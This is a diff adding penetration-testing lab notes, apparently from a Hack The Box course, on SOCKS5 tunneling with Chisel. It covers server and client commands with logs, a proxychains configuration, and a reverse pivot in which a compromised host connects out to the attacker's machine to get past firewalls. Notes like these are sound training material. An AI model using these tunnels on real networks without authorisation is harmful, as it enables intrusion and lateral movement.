@@ -266,3 +266,74 @@ Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
 <snip>
 ```
 
+# SOCKS5 Tunneling with Chisel
+
+[Chisel](https://github.com/jpillora/chisel) is a TCP/UDP-based tunneling tool written in [Go](https://go.dev/) that uses HTTP to transport data that is secured using SSH. `Chisel` can create a client-server tunnel connection in a firewall restricted environment.
+
+## Running the Chisel Server on the Pivot Host
+
+@pivot-host
+```bash
+ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5
+
+2022/05/05 18:16:25 server: Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac=
+2022/05/05 18:16:25 server: Listening on http://0.0.0.0:1234
+```
+
+## Connecting to the Chisel Server
+
+@attack-box
+```bash
+akhmadkun@htb[/htb]$ ./chisel client -v 10.129.202.64:1234 socks
+
+2022/05/05 14:21:18 client: Connecting to ws://10.129.202.64:1234
+2022/05/05 14:21:18 client: tun: proxy#127.0.0.1:1080=>socks: Listening
+2022/05/05 14:21:18 client: tun: Bound proxies
+2022/05/05 14:21:19 client: Handshaking...
+2022/05/05 14:21:19 client: Sending config
+2022/05/05 14:21:19 client: Connected (Latency 120.170822ms)
+2022/05/05 14:21:19 client: tun: SSH connected
+```
+
+## proxychains.conf
+
+```bash
+❯ tail -f /etc/proxychains.conf
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+
+#socks4 	127.0.0.1 9050
+#socks4 	127.0.0.1 9060
+
+socks5 127.0.0.1 1080
+```
+
+
+## Chisel Reverse Pivot
+
+Still, there may be scenarios where firewall rules restrict inbound connections to our compromised target. In such cases, we can use Chisel with the reverse option.
+
+When the Chisel server has `--reverse` enabled, remotes can be prefixed with `R` to denote reversed.
+
+@attack-box
+```bash
+akhmadkun@htb[/htb]$ sudo ./chisel server --reverse -v -p 1234 --socks5
+
+2022/05/30 10:19:16 server: Reverse tunnelling enabled
+2022/05/30 10:19:16 server: Fingerprint n6UFN6zV4F+MLB8WV3x25557w/gHqMRggEnn15q9xIk=
+2022/05/30 10:19:16 server: Listening on http://0.0.0.0:1234
+```
+
+@pivot-host
+```bash
+ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks
+
+2022/05/30 14:19:29 client: Connecting to ws://10.10.14.17:1234
+2022/05/30 14:19:29 client: Handshaking...
+2022/05/30 14:19:30 client: Sending config
+2022/05/30 14:19:30 client: Connected (Latency 117.204196ms)
+2022/05/30 14:19:30 client: tun: SSH connected
+```
+
